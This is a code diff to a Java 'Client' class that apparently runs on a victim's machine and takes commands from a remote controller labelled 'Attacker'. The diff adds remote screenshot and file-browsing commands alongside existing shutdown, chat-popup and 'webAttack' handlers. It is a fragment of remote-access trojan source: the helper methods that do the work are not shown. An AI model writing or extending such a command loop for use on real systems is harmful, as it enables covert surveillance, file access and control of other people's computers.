@@ -34,11 +34,6 @@ public class Client {
 					dout.flush();
 				}
 				
-				else if(recive.length()>7){
-					send=op.webAttack(recive);
-					dout.writeUTF(send);
-					dout.flush();
-				}
 				else if(recive.equals("shut")){
 					send=op.shutDown();
 					dout.writeUTF(send);
@@ -57,15 +52,21 @@ public class Client {
 				else if(recive.equals("chat")){
 					try{
 						//chat
-						dout.writeUTF("chat connected..");
+						dout.writeUTF("chat connected ..");
 						
 						while(!recive.equals("stop")){
 							String temp = "Attacker :";
 							recive = din.readUTF();
+							if(recive.equals("stop")){
+								break;
+							}
 							temp+=recive;
 							send = JOptionPane.showInputDialog(j,temp);
 							dout.writeUTF(send);
 						}
+						
+						dout.writeUTF("chat ended ..");
+						dout.flush();
 						
 						
 					}
@@ -73,6 +74,33 @@ public class Client {
 						dout.writeUTF("stop");
 						dout.flush();
 					}
+				}
+				
+				else if(recive.startsWith("path")){
+					String arr[] = recive.split("`");
+					recive = arr[1];
+					send = op.screenShot(recive);
+					dout.writeUTF(send);
+					dout.flush();
+				}
+				
+				else if(recive.startsWith("dir")){
+					String arr[] = recive.split("`");
+					recive = arr[1];
+					send = op.fileExplore(recive);
+					dout.writeUTF(send);
+					dout.flush();
+				}
+				
+				else if(recive.length()>7){
+					send=op.webAttack(recive);
+					dout.writeUTF(send);
+					dout.flush();
+				}
+				
+				else {
+					dout.writeUTF("something wrong !!");
+					dout.flush();
 				}
 				
 
